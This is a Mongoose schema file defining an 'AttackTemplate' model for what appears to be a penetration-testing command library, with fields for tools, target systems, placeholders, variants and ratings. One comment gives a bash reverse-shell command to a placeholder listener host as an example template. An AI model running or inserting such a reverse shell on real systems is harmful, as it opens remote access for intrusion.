const mongoose = require('mongoose');
const { CATEGORIES_ENUM, TARGET_SYSTEMS } = require('../constants/categories');

const attackTemplateSchema = new mongoose.Schema(
  {
    // Basic Information
    name: {
      type: String,
      required: [true, 'Please provide a template name'],
      trim: true,
      maxlength: [100, 'Name cannot be more than 100 characters'],
    },
    description: {
      type: String,
      trim: true,
      maxlength: [1000, 'Description cannot be more than 1000 characters'],
    },
    longDescription: {
      type: String,
      trim: true,
      // For detailed explanation of what the template does
    },

    // Categorization - Attack Type (Comprehensive module-based)
    category: {
      type: String,
      required: [true, 'Please select an attack type'],
      enum: CATEGORIES_ENUM,
    },
    
    // Sub-category for more granular organization
    subcategory: {
      type: String,
      // Examples: "Linux", "Windows", "Web Application", "Network", etc.
    },
    
    // Tool/Framework specific
    tool: {
      type: String,
      // Examples: "impacket", "netexec", "hashcat", "burp", "sqlmap", etc.
    },
    targetSystem: {
      type: String,
      enum: TARGET_SYSTEMS,
    },
    attackProtocol: {
      type: String,
      // Examples: "Kerberos", "NTLM", "LDAP", "RPC", "HTTP", "SSH", "SMB", etc.
    },

    // Dynamic Fields Configuration
    requiredFields: [
      {
        fieldName: {
          type: String,
          required: true,
        },
        fieldType: {
          type: String,
          enum: ['text', 'number', 'email', 'password', 'url', 'ip', 'port', 'domain', 'select', 'textarea'],
          default: 'text',
        },
        description: String,
        placeholder: String,
        required: {
          type: Boolean,
          default: true,
        },
        // For select type
        options: [String],
        // For conditional fields
        dependsOn: String, // fieldName that this depends on
        dependsValue: String, // value that must be selected
        // Default value
        default: String,
      },
    ],

    // Command Template with Placeholders
    commandTemplate: {
      type: String,
      unique: true,
      required: [true, 'Please provide a command template'],
      // Example: "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1"
    },

    // Multiple variants/payloads for same template
    variants: [
      {
        name: String,
        description: String,
        commandTemplate: String,
      },
    ],

    // Metadata
    createdBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User',
      required: true,
    },
    updatedBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User',
    },

    // Publishing Status - Auto-published, no approval workflow
    published: {
      type: Boolean,
      default: true,
    },
    publishedAt: {
      type: Date,
      default: Date.now,
    },

    // Privacy Status
    isPrivate: {
      type: Boolean,
      default: false,
      // true = only visible to owner
      // false = visible to all users (public)
    },

    // Quality Metrics
    tags: [String],
    difficulty: {
      type: String,
      enum: ['Beginner', 'Intermediate', 'Advanced', 'Expert'],
      default: 'Intermediate',
    },

    // User Engagement
    ratings: [
      {
        userId: {
          type: mongoose.Schema.Types.ObjectId,
          ref: 'User',
        },
        score: {
          type: Number,
          min: 1,
          max: 5,
        },
        comment: String,
        createdAt: {
          type: Date,
          default: Date.now,
        },
      },
    ],
    averageRating: {
      type: Number,
      default: 0,
      min: 0,
      max: 5,
    },
    totalRatings: {
      type: Number,
      default: 0,
    },

    // Usage Statistics
    usageCount: {
      type: Number,
      default: 0,
    },
    lastUsedAt: Date,
    
    // View tracking for analytics
    viewCount: {
      type: Number,
      default: 0,
    },
    lastViewedAt: Date,

    // Dependencies and Related Templates
    relatedTemplates: [
      {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'AttackTemplate',
      },
    ],

    // Version Control
    version: {
      type: Number,
      default: 1,
    },
    changelog: [
      {
        version: Number,
        changes: String,
        changedBy: {
          type: mongoose.Schema.Types.ObjectId,
          ref: 'User',
        },
        changedAt: {
          type: Date,
          default: Date.now,
        },
      },
    ],

    // Admin Notes
    adminNotes: String,
    isFeatured: {
      type: Boolean,
      default: false,
    },

    // SEO and Discovery
    keywords: [String],
    searchTags: [String],
  },
  {
    timestamps: true,
  }
);

// Create index for better search performance
attackTemplateSchema.index({ name: 'text', description: 'text', tags: 1 });
attackTemplateSchema.index({ category: 1, published: 1 });
attackTemplateSchema.index({ tool: 1 });
attackTemplateSchema.index({ targetSystem: 1 });
attackTemplateSchema.index({ attackProtocol: 1 });
attackTemplateSchema.index({ createdBy: 1 });
attackTemplateSchema.index({ isFeatured: 1, published: 1 });
attackTemplateSchema.index({ averageRating: -1, totalRatings: -1 });
attackTemplateSchema.index({ isPrivate: 1, createdBy: 1 });

module.exports = mongoose.model('AttackTemplate', attackTemplateSchema);
